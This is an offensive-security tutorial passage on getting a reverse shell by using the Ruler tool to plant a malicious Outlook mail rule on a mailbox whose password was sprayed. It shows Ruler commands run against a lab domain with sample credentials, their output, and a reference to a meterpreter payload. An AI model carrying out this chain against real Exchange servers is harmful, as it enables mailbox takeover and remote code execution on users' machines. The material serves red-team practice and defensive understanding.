### Getting a Shell via Malicious Email Rule

If the password spray against an Exchange server was successful and you have obtained valid credentials, you can now leverage Ruler to create a malicious email rule to that will gain you remote code execution on the host that checks that compromised mailbox.

A high level overwiew of how the spraying and remote code execution works:
* assume you have obtained working credentials during the spray for the user spotless@offense.local
* with the help of Ruler, a malicious mail rule is created for the compromised account which in our case is spotless@offense.local. The rule created will conform to the format along the lines of:
* if emailSubject contains someTriggerWordstartpathToSomeProgram
* A new email with subject containing someTriggerWord is sent to the spotless@offense.local
* User `spotless` logs on to his/her workstation and launches Outlook client to check for new email

Malicious email comes in and the malicious mail rule is triggered, which in turn starts the program specified in pathToSomeProgram which is pointing to a malicious payload giving a reverse shell to the attacker

```
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```

The below suggests the credentials are working and that no mail rules are set for this account yet:

```
root@kali ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
[+] Found cached Autodiscover record. Using this (use --nocache to force new lookup)
[*] MAPI URL found: https://dc01.offense.local/mapi/emsmdb/?MailboxId=XXXX-XXXX-XXXX@offense.local
[*] MAPI AddressBook URL found:
[*] User DN: /o=offense/ou=Exchange Administrative Group {redacted for brevity}
[*] Got Context, Doing ROPLogin
[*] And we are authenticated
[*] Openning the Inbox
[+] Retrieving Rules
[+] No Rules Found
[*] And disconnecting from server

```

To carry out the attack further, I've generated a reverse meterpreter payload and saved it as a windows executable in /root/tools/evilm64.exe
